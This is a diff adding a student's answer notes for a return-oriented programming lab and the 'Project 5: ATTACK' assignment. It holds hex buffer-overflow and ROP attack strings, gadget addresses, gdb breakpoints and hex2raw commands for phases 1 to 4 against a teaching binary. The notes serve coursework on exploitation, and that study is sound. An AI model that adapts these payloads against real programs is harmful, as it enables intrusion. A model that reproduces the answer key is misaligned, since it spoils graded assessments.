@@ -1,0 +1,112 @@
+Lab 13
+Question 1 - What is the address of the [pop %rdi; ret] gadget?
+0x72244e --> 0x72245b
+
+Question 2 - What is the the hexadecimal representation of our attack input, assuming 
+that there are 8 bytes of filler before the original return address appears on the stack?
+00 00 00 00 00 00 00 00 /* Padding */
+5b 24 72 00 00 00 00 00 /* Gadget address (overwrites return address) */
+44 22 44 22 44 22 44 22 /* Value for popping */
+88 77 66 55 44 33 22 11 /* Address of target function */
+
+Question 3 - What are the addresses in memory of the two gadgets?
+pop %rcx; ret - 0x000000000072243d
+movl %ecx, %esi - 0x000000000072244c
+
+Question 4 - What is the hexadecimal representation of our attack input for this second attack?
+00 00 00 00 00 00 00 00 /* Padding */
+3d 24 72 00 00 00 00 00 /* Address of gadget 1 (overwrites return address) */
+24 42 22 00 00 00 00 00 /* Value for popping (into %rcx) */
+4c 24 72 00 00 00 00 00 /* Address of gadget 2 (movl %ecx, %esi) */
+11 22 33 44 55 66 77 88 /* Address of target function */
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Project 5: ATTACK
+
+~~PHASE 1~~
+buffer size = 24
+address of touch1 = 0x401835
+cookie = 0x1ca77e1e
+00 00 00 00 00 00 00 00 /* Padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+35 18 40 00 00 00 00 00 /* address of touch1 */
+
+./hex2raw <phase1.txt> raw-phase1.txt
+
+~~PHASE 2~~
+b getbuf
+b touch2
+b Gets
+Cookie: 0x1ca77e1e
+Address of touch2: 0x401861
+
+pop %rdi /*--> 5f */
+retq /*--> c3 */
+
+00 00 00 00 00 00 00 00 /* Padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+08 1d 66 55 00 00 00 00 /* Address of expoit code(rsp+30=0x55661cd8+0x30=0x55661d08) */
+1e 7e a7 1c 00 00 00 00 /* Cookie */
+61 18 40 00 00 00 00 00 /* Address of touch2 */
+5f c3 00 00 00 00 00 00 /* EXPLOIT CODE (pop %rdi; retq) */
+
+gcc -c phase2.s
+objdump -d phase2.o > phase2.d
+
+~~PHASE 3~~
+b strncmp
+b touch3
+b Gets
+b * 0x40182b (right before rsp+0x18 and retq (end of getbuf))
+
+**Make each cookie digit into its ascii code
+Cookie: 1ca77e1e = 31 63 61 37 37 65 31 65 [ascii code]
+Address of touch3: 0x401972
+
+00 00 00 00 00 00 00 00 /* Padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+08 1d 66 55 00 00 00 00 /* Address of exploit code(rsp+30=0x55661cd8+0x30=0x55661d08) */
+18 1d 66 55 00 00 00 00 /* Address of cookie string(rsp+40=0x55661cd8+0x40=0x55661d18) */
+72 19 40 00 00 00 00 00 /* Address of touch3 */
+5f c3 00 00 00 00 00 00 /* EXPLOIT CODE (pop %rdi; retq) */
+00 00 00 00 00 00 00 00 /* terminate ascii string w/ '00' */
+31 63 61 37 37 65 31 65 /* Cookie as an ascii string */
+00 00 00 00 00 00 00 00 /* terminate ascii string w/ '00' */
+
+./hex2raw < phase3.txt > raw-phase3.txt
+run < raw-phase3.txt
+
+~~PHASE  4~~
+Gadgets:
+Gad 1: pop %rdi; retq /*--> 5f c3*/
+Gad 2: retq /*--> c3 */
+
+00 00 00 00 00 00 00 00 /* Padding */
+00 00 00 00 00 00 00 00 /* Padding */
+00 00 00 00 00 00 00 00 /* Padding */
+40 1a 40 00 00 00 00 00 /* Gad 1 address --(0x401a09+0xb5=0x401abe)--> 0x401a40 */
+1e 7e a7 1c 00 00 00 00 /* Cookie */
+2d 1a 40 00 00 00 00 00 /* Gad 2 address --(0x401a09+0x81=0x401a8a)--> 0x401a2d */
+61 18 40 00 00 00 00 00 /* Address of touch2 */
+
+
+r < raw-phase4.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
